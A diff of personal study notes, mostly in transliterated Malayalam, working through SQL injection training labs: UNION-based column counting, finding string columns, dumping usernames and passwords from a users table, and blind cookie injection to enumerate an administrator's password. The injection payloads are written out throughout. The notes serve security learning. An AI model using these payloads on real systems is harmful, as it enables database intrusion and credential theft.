@@ -79,12 +79,39 @@ namml column names ariyanga index arinja mathi.index exeed aayal:
 -->If the number of nulls does not match the number of columns, the database returns an error, such as:
    **`All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists`**
 -->On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.athayath -- ittathinushesham space nirbandamayum idanam
+
+==NOTE :==
+```
+table 1            table 2
+      a | b               c | d
+      -----              -------
+      1 , 2               3 , 4
+      5 , 6               7 , 8
+
+1) query ->  select a,b from table 1             ( athayath table 1 ile columns a and b il ninum sathanam retrieve chyuka )
+   ivide a and b cloumns aan. athile values retireve chyumbol result :
+   1 , 2
+   5 , 6
+2) union query -> select a,b from table 1 UNION select c,d from table 2
+   ivide rand table il ninum namal UNION opertor vazhi retrieve chyunu.so result :
+   1 , 2
+   3 , 4
+   5 , 6
+   7 , 8
+ivide table 1 ile a ine usernames and b ine passwords column aayi kandalmathi apo kathikolum.so oro column ilum athintethaya values undakum.
+->so namuk ingane hack chyanengil aadyam namal specify chyuna table il ethra columns unden ariyanam.athinu namal null,null allengil orderby 1..2.  ithil ethengilum chyth nokanam ok.
    
+```
+    
        Lab-3.a (SQL injection UNION attack, determining the number of columns)
 	          ====================================================
-
+-->aadyam category parameter il ='  oru qoute itt nokuka apol application break aayi
+-->so ini ='--   itt (no-space)  chythapol baki sql code comment aayi.so application 200 status code thanu.so ithinartham sql injection correct aayi nadakunund ennan ok
 -->GET /filter?category=5'+UNION+SELECT+NULL,NULL,NULL-- HTTP/1.1
     ivide category enna parameteril aan ethra column und enn nokiyath
+-->ivide namal NULL
+-->order by cluse upayogichum namuk columns nokan :
+-->GET /filter?category=5'+ORDERBY+1--    itt test chyuka.enit iterate chythal mathi
 
 --------------------------------------------------------------------
  
@@ -104,11 +131,13 @@ namml column names ariyanga index arinja mathi.index exeed aayal:
                 Lab-3.b (practical-finding column that contain string in it 
 				        ==========================================
 		
-first we need to find how many columns are there
-          -->'+UNION+SELECT+NULL--
-second we need to find the column that contains string in it:
-           -->' UNION SELECT NULL,'josu',NULL--
---------------------------------------------------------------------------------------
+-->first we need to find how many columns are there
+          -->category='+UNION+SELECT+NULL--
+-->second we need to find the column that contains string in it:
+           -->category=' UNION SELECT NULL,'josu',NULL--
+-->ivide randamathe coloumn mathraman string
+
+=======================================================
 
          Lab-3.c(theory):
 		 
@@ -126,6 +155,7 @@ second we need to find the column that contains string in it:
            -->' UNION SELECT NULL,'josu',NULL--
 third we need to retrive username and password from users table:
            -->'+UNION+SELECT+username,password+FROM+users--
+-->==oru karyam sredhikuka namal matoru table il (users)ninuman usernmae and passwords dump chyunath.so ingane chyumbol rand column thane aayirikanam currently ulla table il undayirikendath athupole columns randum string aayirikanam ok.ini athava oru column mathrame string support chyunenil ath adutha lab il nokiyal mathi ok.==
 		
 --------------------------------------------------------------------
 
@@ -259,14 +289,16 @@ ivide ninum admin,password kitum
          -->cookie'+and+1=1-- itt nokuka.ok aanenkil blind sql i und
 -->second confirm that we have a users table:
     -->'+and+(select+'x'+from+users+LIMIT+1)='x'--            (yes it exist)
+-->athayath ith sheriyanengil x=x varum(karanam query nok users enna table undengil x enna letter output chyanam ennan query) so true kanikum apol welcome back enna maessage site il varum so angane namuk manasilakam users enna table und enn.
 -->third confirm that username administrator exist in the users table:
      -->'+and+(select+username+from+users+where+username='administrator')
                ='administrator'--    (better url encode on burp before clicking send)
      ivide namuk welcome back enn kanam which means administrator enna username und.
 	 nammal chyunath correct aano enn ariyan "wlcome back" enna msg varunundo enn nokiya mathi
--->fourth enumerate the password of the administrator:
+-->fourth enumerate the lenth of the password of the administrator:
 -->'+and+(select+username+from+users+where+username='administrator'+and+
       LENGTH(password)>1)='administrator'--;     (url encode chyuka)
+-->ingnae oro query kazhinj 1 ullath mati 2,3,4,... ignane kodukuka enit avasanam length kazhinjal ath administrator umayi equal aakila apol namuk manasilakam lenght athrem aan ullathen ok
 -->ee saththanam nammal burp intruderil itt brute force chyth nokanam.apol ariyan patum password inte correct length.ok.ipol length masasilayi ini charecters nokam
 -->'+and+(select+substring(password,1,1)+from+users+where+username=
      'administrator')='a'--;                (Note oracle il substr mathrame uloo)
